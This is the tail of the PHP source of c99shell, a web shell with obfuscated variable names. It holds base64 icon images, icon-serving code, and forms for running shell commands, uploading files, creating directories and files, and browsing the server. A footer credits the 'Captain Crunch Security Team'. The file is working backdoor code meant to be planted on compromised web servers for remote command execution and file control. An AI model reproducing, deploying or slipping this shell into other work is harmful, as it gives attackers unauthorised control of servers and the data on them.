'/52nuqjK5/n///j///7///r//0trlsPn/8nn/8nZ5trm79nu/8/q/9Xt/9zw/93w/+j1/9Hr/+Dv' . '/d7v/73H0MjU39zu/9br/8ne8tXn+K6/z8Xj/LjV7dDp/6K4y8bl/5O42Oz2/7HW9Ju92u/9/8T3' . '/+L//+7+/+v6/+/6/9H4/+X6/+Xl5Pz//+/t7fX08vD//+3///P///H///P7/8nq/8fp/8Tl98zr' . '/+/z9vT4++n1/b/k/dny/9Hv/+v4/9/0/9fw/8/u/8vt/+/09xUvXhQtW4KTs2V1kw4oVTdYpDZX' . 'pVxqhlxqiExkimKBtMPL2Ftvj2OV6aOuwpqlulyN3cnO1wAAXQAAZSM8jE5XjgAAbwAAeURBYgAA' . 'dAAAdzZEaE9wwDZYpmVviR49jG12kChFmgYuj6+1xeLn7Nzj6pm20oeqypS212SJraCyxZWyz7PW' . '9c/o/87n/8DX7MHY7q/K5LfX9arB1srl/2+fzq290U14q7fCz6e2yXum30FjlClHc4eXr6bI+bTK' . '4rfW+NXe6Oby/5SvzWSHr+br8WuKrQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAjgACsJrDRHSICDQ7IMXDgJx8EvZuIcbPBooZwbBwOMAfMmYwBCA2sEcNBjJCMYATLIOLiokocm' . 'C1QskAClCxcGBj7EsNHoQAciSCC1mNAmjJgGGEBQoBHigKENBjhcCBAIzRoGFkwQMNKnyggRSRAg' . '2BHpDBUeewRV0PDHCp4BSgjw0ZGHzJQcEVD4IEHJzYkBfo4seYGlDBwgTCAAYvFE4KEBJYI4UrPF' . 'CyIIK+woYjMwQQI6Cor8mKEnxR0nAhYKjHJFQYECkqSkSa164IM6LhLRrr3wwaBCu3kPFKCldkAA' . 'Ow==', 'ext_doc' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///8DAwAAA/4CAgAAAAAAAAAAAAANR' . 'WErcrrCQQCslQA2wOwdXkIFWNVBA+nme4AZCuolnRwkwF9QgEOPAFG21A+Z4sQHO94r1eJRTJVmq' . 'MIOrrPSWWZRcza6kaolBCOB0WoxRud0JADs=', 'ext_exe' => 'R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7' . 'WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt' . 'xhIAOw==', 'ext_h' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANB' . 'WLPc9XCASScZ8MlKCcARRwVkEAKCIBKmNqVrq7wpbMmbbbOnrgI8F+q3w9GOQOMQGZyJOspnMkKo' . 'Wq/NknbbSgAAOw==', 'ext_hpp' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANF' . 'WLPc9XCASScZ8MlKicobBwRkEAGCIAKEqaFqpbZnmk42/d43yroKmLADlPBis6LwKNAFj7jfaWVR' . 'UqUagnbLdZa+YFcCADs=', 'ext_htaccess' => 'R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6' . 'WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJ' . 'AAA7', 'ext_html' => 'R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz' . 'c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P' . 'KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk' . 'Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR' . 'ADs=', 'ext_jpg' => 'R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci' . 'Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd' . 'FxEAOw==', 'ext_js' => 'R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH' . 'k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs' . 'a00AjYYBbc/o9HjNniUAADs=', 'ext_lnk' => 'R0lGODlhEAAQAGYAACH5BAEAAFAALAAAAAAQABAAhgAAAABiAGPLMmXMM0y/JlfFLFS6K1rGLWjO' . 'NSmuFTWzGkC5IG3TOo/1XE7AJx2oD5X7YoTqUYrwV3/lTHTaQXnfRmDGMYXrUjKQHwAMAGfNRHzi' . 'Uww5CAAqADOZGkasLXLYQghIBBN3DVG2NWnPRnDWRwBOAB5wFQBBAAA+AFG3NAk5BSGHEUqwMABk' . 'AAAgAAAwAABfADe0GxeLCxZcDEK6IUuxKFjFLE3AJ2HHMRKiCQWCAgBmABptDg+HCBZeDAqFBWDG' . 'MymUFQpWBj2fJhdvDQhOBC6XF3fdR0O6IR2ODwAZAHPZQCSREgASADaXHwAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAeZgFBQPAGFhocAgoI7Og8JCgsEBQIWPQCJgkCOkJKUP5eYUD6PkZM5' . 'NKCKUDMyNTg3Agg2S5eqUEpJDgcDCAxMT06hgk26vAwUFUhDtYpCuwZByBMRRMyCRwMGRkUg0xIf' . '1lAeBiEAGRgXEg0t4SwroCYlDRAn4SmpKCoQJC/hqVAuNGzg8E9RKBEjYBS0JShGh4UMoYASBiUQ' . 'ADs=', 'ext_log' => 'R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAMDAwICAgICAAAAAgAAA////AAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARQEKEwK6UyBzC475gEAltJklLRAWzbClRhrK4Ly5yg7/wN' . 'zLUaLGBQBV2EgFLV4xEOSSWt9gQQBpRpqxoVNaPKkFb5Eh/LmUGzF5qE3+EMIgIAOw==', 'ext_php' => 'R0lGODlhEAAQAAAAACH5BAEAAAEALAAAAAAQABAAgAAAAAAAAAImDA6hy5rW0HGosffsdTpqvFlg' . 't0hkyZ3Q6qloZ7JimomVEb+uXAAAOw==', 'ext_pl' => 'R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo' . 'GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7', 'ext_swf' => 'R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/O' . 'nAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA' . 'ABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GA' . 'GBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgC' . 'NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=', 'ext_tar' => 'R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JIC' . 'Wv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XF' . 'HgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGD' . 'UyWd/0it/1u1/3NzAP950P990mO5/7v14YzvzXLrwoXI/5vS/7Dk/wBXov9syvRjwOhatQCHV17p' . 'uo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkg' . 'GwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMd' . 'HUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FB' . 'u4tLAgEAOw==', 'ext_txt' => 'R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ' . 'SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7' . 'UpPWG3Ig6Hq/XmRjuZwkAAA7', 'ext_wri' => 'R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao' . 'a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=', 'ext_xml' => 'R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA' . 'gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx' . 'OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ' . 'IQA7'); $sp5f36b0 = array('ext_tar' => array('ext_tar', 'ext_r00', 'ext_ace', 'ext_arj', 'ext_bz', 'ext_bz2', 'ext_tbz', 'ext_tbz2', 'ext_tgz', 'ext_uu', 'ext_xxe', 'ext_zip', 'ext_cab', 'ext_gz', 'ext_iso', 'ext_lha', 'ext_lzh', 'ext_pbk', 'ext_rar', 'ext_uuf'), 'ext_php' => array('ext_php', 'ext_php3', 'ext_php4', 'ext_php5', 'ext_phtml', 'ext_shtml', 'ext_htm'), 'ext_jpg' => array('ext_jpg', 'ext_gif', 'ext_png', 'ext_jpeg', 'ext_jfif', 'ext_jpe', 'ext_bmp', 'ext_ico', 'ext_tif', 'tiff'), 'ext_html' => array('ext_html', 'ext_htm'), 'ext_avi' => array('ext_avi', 'ext_mov', 'ext_mvi', 'ext_mpg', 'ext_mpeg', 'ext_wmv', 'ext_rm'), 'ext_lnk' => array('ext_lnk', 'ext_url'), 'ext_ini' => array('ext_ini', 'ext_css', 'ext_inf'), 'ext_doc' => array('ext_doc', 'ext_dot'), 'ext_js' => array('ext_js', 'ext_vbs'), 'ext_cmd' => array('ext_cmd', 'ext_bat', 'ext_pif'), 'ext_wri' => array('ext_wri', 'ext_rtf'), 'ext_swf' => array('ext_swf', 'ext_fla'), 'ext_mp3' => array('ext_mp3', 'ext_au', 'ext_midi', 'ext_mid'), 'ext_htaccess' => array('ext_htaccess', 'ext_htpasswd', 'ext_ht', 'ext_hta', 'ext_so')); if (!$spc14e3a) { header('Content-type: image/gif'); header('Cache-control: public'); header('Expires: ' . date('r', mktime(0, 0, 0, 1, 1, 2030))); header('Cache-control: max-age=' . 60 * 60 * 24 * 7); header('Last-Modified: ' . date('r', filemtime(__FILE__))); foreach ($sp5f36b0 as $sp71a197 => $spe2ff4f) { if (in_array($sp087259, $spe2ff4f)) { $sp087259 = $sp71a197; break; } } if (empty($spfff1b9[$sp087259])) { $sp087259 = 'small_unk'; } if (in_array($sp087259, $sp7dbb5d)) { $sp087259 = 'ext_tar'; } echo base64_decode($spfff1b9[$sp087259]); } else { foreach ($sp5f36b0 as $sp5955cc => $sp873f91) { foreach ($sp873f91 as $sp6bf0a4) { if ($sp5955cc != $sp6bf0a4) { if (!empty($spfff1b9[$sp6bf0a4])) { echo 'Warning! Remove $images[' . $sp6bf0a4 . ']<br>'; } } } } natsort($spfff1b9); $sp71a197 = array_keys($spfff1b9); echo '<center>'; foreach ($sp71a197 as $spcd3c39) { echo $spcd3c39 . ':<img src="' . $sp8c8b96 . 'act=img&img=' . $spcd3c39 . '" border="1"><br>'; } echo '</center>'; } die; } echo '[syslog]04
'; if ($spe3b8cc == 'about') { echo '<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tips - NukLeoN [AnTiSh@Re tEaM].<br>Thanks all who report bugs.<br>All bugs send to tristram\'s ICQ #656555 <a href="http://wwp.icq.com/scripts/contact.dll?msgto=656555"><img src="http://wwp.icq.com/scripts/online.dll?icq=656555&img=5" border=0 align=absmiddle></a>.</b>'; } ?>
</td></tr></table><a bookmark="minipanel"><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td width="100%" height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php  echo $sp8c8b96; ?>
act=cmd&d=<?php  echo urlencode($sp6bf0a4); ?>
"><b>Command execute</b></a> ::</b></p></td></tr>
<tr><td width="50%" height="1" valign="top"><center><b>Enter: </b><form action="<?php  echo $sp8c8b96; ?>
"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php  echo $sp67e5dd; ?>
"><input type="text" name="cmd" size="50" value="<?php  echo htmlspecialchars($sp7bd36a); ?>
"><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td><td width="50%" height="1" valign="top"><center><b>Select: </b><form action="<?php  echo $sp8c8b96; ?>
act=cmd" method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="<?php  echo $sp67e5dd; ?>
"><select name="cmd"><?php  foreach ($sp8ce7d0 as $spce9133) { echo '<option value="' . htmlspecialchars($spce9133[1]) . '">' . htmlspecialchars($spce9133[0]) . '</option>'; } ?>
</select><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td></tr></TABLE>
<br>
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr>
 <td width="50%" height="1" valign="top"><center><b>:: <a href="<?php  echo $sp8c8b96; ?>
act=search&d=<?php  echo urlencode($sp6bf0a4); ?>
"><b>Search</b></a> ::</b><form method="POST"><input type=hidden name=act value="search"><input type=hidden name="d" value="<?php  echo $sp67e5dd; ?>
"><input type="text" name="search_name" size="29" value="(.*)">&nbsp;<input type="checkbox" name="search_name_regexp" value="1"  checked> - regexp&nbsp;<input type=submit name=submit value="Search"></form></center></p></td>
 <td width="50%" height="1" valign="top"><center><b>:: <a href="<?php  echo $sp8c8b96; ?>
act=upload&d=<?php  echo $spb26308; ?>
"><b>Upload</b></a> ::</b><form method="POST" ENCTYPE="multipart/form-data"><input type=hidden name=act value="upload"><input type="file" name="uploadfile"><input type=hidden name="miniform" value="1">&nbsp;<input type=submit name=submit value="Upload"><br><?php  echo $sp6a8a02; ?>
</form></center></td>
</tr>
</table>
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Make Dir ::</b><form action="<?php  echo $sp8c8b96; ?>
"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<?php  echo $sp67e5dd; ?>
"><input type="text" name="mkdir" size="50" value="<?php  echo $sp67e5dd; ?>
">&nbsp;<input type=submit value="Create"><br><?php  echo $sp6a8a02; ?>
</form></center></td><td width="50%" height="1" valign="top"><center><b>:: Make File ::</b><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php  echo $sp67e5dd; ?>
"><input type="text" name="mkfile" size="50" value="<?php  echo $sp67e5dd; ?>
"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br><?php  echo $sp6a8a02; ?>
</form></center></td></tr></table>
<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Go Dir ::</b><form action="<?php  echo $sp8c8b96; ?>
"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="<?php  echo $sp67e5dd; ?>
">&nbsp;<input type=submit value="Go"></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Go File ::</b><form action="<?php  echo $sp8c8b96; ?>
"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php  echo $sp67e5dd; ?>
"><input type="text" name="f" size="50" value="<?php  echo $sp67e5dd; ?>
">&nbsp;<input type=submit value="Go"></form></center></td></tr></table>
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99shell v. <?php  echo $sp272375; ?>
 <a href="<?php  echo $sp8c8b96; ?>
act=about"><u><b>powered by</b></u></a> Captain Crunch Security Team | <a href="http://ccteam.ru"><font color="#FF0000">http://ccteam.ru</font></a><font color="#FF0000"></font> | Generation time: <?php  echo round(getmicrotime() - starttime, 4); ?>
 ]--</b></p></td></tr></table>
</body></html><?php  chdir($sp5f015d); c99shexit();